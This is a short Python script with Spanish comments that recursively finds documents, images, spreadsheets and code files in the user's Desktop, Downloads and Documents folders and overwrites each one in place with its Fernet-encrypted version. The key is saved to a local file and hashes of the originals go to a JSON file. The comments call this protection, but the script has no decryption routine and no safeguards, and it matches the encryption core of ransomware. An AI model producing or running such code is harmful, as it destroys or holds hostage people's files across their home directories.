# hla
import os
from cryptography.fernet import Fernet
import json
import hashlib

# Tipos de archivo permitidos
EXTENSIONES_PERMITIDAS = ['.txt', '.pdf', '.jpg', '.jpeg', '.png', '.docx', '.xlsx', '.md', '.py', '.csv']

# Rutas seguras para procesar
RUTAS_A_PROTEGER = [
    os.path.expanduser("~/Escritorio"),
    os.path.expanduser("~/Descargas"),
    os.path.expanduser("~/Documentos")
]

def generar_key(path="key.key"):
    key = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(key)
    return key

def cargar_key(path="key.key"):
    with open(path, "rb") as f:
        return f.read()

def calcular_hash(data):
    return hashlib.sha256(data).hexdigest()

def encontrar_archivos(rutas):
    archivos = []
    for ruta in rutas:
        for dirpath, _, filenames in os.walk(ruta):
            for nombre in filenames:
                _, ext = os.path.splitext(nombre)
                if ext.lower() in EXTENSIONES_PERMITIDAS:
                    archivos.append(os.path.join(dirpath, nombre))
    return archivos

def encriptar_archivos(archivos, key):
    f = Fernet(key)
    hashes = {}
    for archivo in archivos:
        with open(archivo, "rb") as file:
            datos = file.read()
        hash_original = calcular_hash(datos)
        datos_cifrados = f.encrypt(datos)
        with open(archivo, "wb") as file:
            file.write(datos_cifrados)
        hashes[archivo] = hash_original
        print(f"✔ Encriptado: {archivo}")
    return hashes

if __name__ == "__main__":
    print("[🔒] Iniciando encriptación...")
    key = generar_key()
    archivos = encontrar_archivos(RUTAS_A_PROTEGER)
    hashes = encriptar_archivos(archivos, key)
    
    # Guardar hashes para validación posterior
    with open("hashes.json", "w") as f:
        json.dump(hashes, f, indent=2)

    print("\n[✅] Archivos encriptados. Clave guardada en 'key.key' y hashes en 'hashes.json'")
